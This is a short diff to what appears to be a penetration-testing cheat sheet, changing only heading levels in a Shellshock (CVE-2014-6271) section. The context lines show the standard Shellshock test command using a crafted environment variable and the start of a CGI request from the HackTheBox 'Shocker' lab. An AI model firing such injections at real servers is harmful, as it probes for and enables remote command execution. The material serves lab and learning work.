@@ -731,14 +731,14 @@ httpd.serve_forever()
 ```
 
 # Shell Shock
-CVE-2014-6271
+## CVE-2014-6271
 ```bash
 env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
 ```
 
-Example from HTB (Shocker)
+## Example from HTB (Shocker)
 
-## Request
+### Request
 ```
 GET /cgi-bin/user.sh HTTP/1.1
 
@@ -750,7 +750,7 @@ Connection: close
 
 ```
 
-## Response
+### Response
 ```
 HTTP/1.1 200 OK
 
